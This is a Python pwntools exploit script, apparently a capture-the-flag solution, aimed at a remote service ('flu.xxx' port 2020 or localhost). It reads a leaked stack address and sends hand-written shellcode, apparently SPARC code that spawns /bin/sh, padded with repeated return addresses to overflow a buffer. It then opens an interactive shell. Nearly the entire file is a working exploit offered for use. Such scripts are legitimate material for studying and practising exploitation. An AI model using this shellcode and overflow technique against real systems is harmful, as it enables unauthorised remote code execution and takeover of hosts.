from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=4444,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "flu.xxx"
    port = 2020
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

shellcode = "\x90\x1A\x40\x09" + "\x92\x1A\x40\x09" + "\x82\x10\x20\xCA" + "\x91\xD0\x20\x08" + "\x21\x0B\xD8\x9A" + "\xA0\x14\x21\x6E" + "\x23\x0B\xDC\xDA" + "\xE0\x3B\xBF\xF0" + "\x90\x23\xA0\x10" + "\xD0\x23\xBF\xF8" + "\x92\x23\xA0\x08" + "\x94\x1A\x80\x0A" + "\x82\x10\x20\x3B" + "\x91\xD0\x20\x08"

stack = int(recvline(), 16)
print(hex(stack))

addr = p32(stack)[::-1]
wait_for_attach()

# b *0x000104ac
#sendline(shellcode + (addr * 150))
sendline(shellcode)
import time
time.sleep(1)
sendline(shellcode + addr * ((0x200 - len(shellcode)) // 8))

interactive()




